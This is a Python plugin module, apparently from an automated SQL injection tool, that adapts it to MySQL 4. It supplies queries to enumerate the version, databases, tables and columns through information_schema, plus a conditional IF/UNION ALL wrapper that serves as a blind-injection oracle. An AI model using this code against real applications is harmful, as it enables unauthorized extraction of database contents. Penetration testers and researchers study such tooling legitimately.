from ..core.plugin import *
from ..core.forge import SQLForge

class Mysql4Forge(SQLForge):
	def __init__(self, context):
		SQLForge.__init__(self, context)
		
	"""
	Define overrides
	"""
	
	def getVersion(self):
		return "@@VERSION"
		
	def getDatabases(self):
		return "SELECT schema_name FROM information_schema.schemata"
		
	def getTables(self, db):
		return "SELECT table_name FROM information_schema.tables WHERE table_schema=%s" % self.wrapString(db)
		
	def getFields(self, table, db):
		return "SELECT column_name FROM information_schema.columns WHERE table_schema=%s AND table_name=%s" % (self.wrapString(db), self.wrapString(table))

	def wrapMid(self, cdt):
		return self.wrapSQL("SELECT IF(%s,%s,(SELECT %s UNION ALL SELECT %s ))" % (cdt,self.wrapField('0'),self.wrapField('0'),self.wrapField('0')))


@plugin('mysqlv4','Mysql version 4')
@allow(COMMENT | STR)
class Mysql4(Plugin):	
	def __init__(self, context, injector, limit_count_max=500):
		Plugin.__init__(self, Mysql4Forge, context, injector, limit_count_max)
		